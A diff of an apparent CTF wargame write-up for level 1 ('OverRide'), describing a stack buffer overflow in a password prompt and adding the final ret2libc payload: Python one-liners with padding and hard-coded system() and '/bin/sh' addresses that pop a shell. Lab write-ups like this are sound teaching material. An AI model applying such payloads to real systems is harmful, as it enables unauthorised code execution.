@@ -1,7 +1,9 @@
 <h1 align="center"> LEVEL 1 </h1>
 
 ## 🔍 Analysis of Decompiled [level1](./pseudo.c)
->scp -P 4242 level01@ip:/home/users/level01/level01 .
+> scp -P 4242 level01@ip:/home/users/level01/level01 .
+
+The vulnerability is a **stack buffer overflow** in the password input function.
 
 ### The Addresses (found via GDB)
 ```bash
@@ -37,12 +39,10 @@ Mapped address spaces:
 
 ```
 
+```bash
+0xf7e6aed0 - system()
+0xf7f897ec - "/bin/sh"
 ```
-0xf7e6aed0 - system() function address
-0xf7f897ec - "/bin/sh" string address
-```
-
-The vulnerability is a **stack buffer overflow** in the password input function.
 
 **Breakdown:**
 1. `"dat_wil\n"` - **Username** (passes verify_user_name check)
@@ -70,6 +70,11 @@ The vulnerability is a **stack buffer overflow** in the password input function.
 ### Final Payload Execution
 
 ```bash
+level01@OverRide:$ (python -c 'print "dat_will\n" + "A"*80 + "\xd0\xae\xe6\xf7" + "EXIT"+ "\xec\x97\xf8\xf7"';cat)| ./level01 
+
+level01@OverRide:$ python -c 'print "dat_wil\n" + "A"*80 + "\xd0\xae\xe6\xf7" + "BBBB"+ "\xec\x97\xf8\xf7"' > /tmp/pay
+
+level01@OverRide:~$ (cat /tmp/pay ; cat) | ./level01
 
 ``` 
 
